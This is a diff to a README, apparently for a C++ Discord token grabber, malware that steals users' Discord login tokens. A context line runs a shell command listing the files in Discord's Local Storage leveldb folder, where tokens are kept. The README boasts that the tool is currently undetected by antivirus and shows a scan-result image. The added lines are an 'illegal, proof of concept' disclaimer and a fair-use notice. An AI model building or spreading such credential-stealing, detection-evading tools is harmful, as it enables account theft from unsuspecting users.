@@ -32,7 +32,17 @@ As you can see here it's a hardcoded solution but it works fine for this purpose
 auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
 ```
 
+# Usage
+This is illegal to use and is only a proof of concept since i haven't seen a C++ token grabber.
+I do not condone use or distribution of it!
+
 # Detection
 Since it's fresh and not copied it is currently undetected
 
 ![Detection](https://antiscan.me/images/result/huIT9opQ9Off.png)
+
+# Educational Purposes
+
+Copyright Disclaimer Under Section 107 of the Copyright Act 1976,
+allowance is made for"fair use" for purposes such as criticism, comment,news reporting,teaching scholarship, and research. Fair use is a use permitted by copyright statute that might otherwise be infringing. Non-profit, educational or personal use tips the balance in favor of fair use."
+
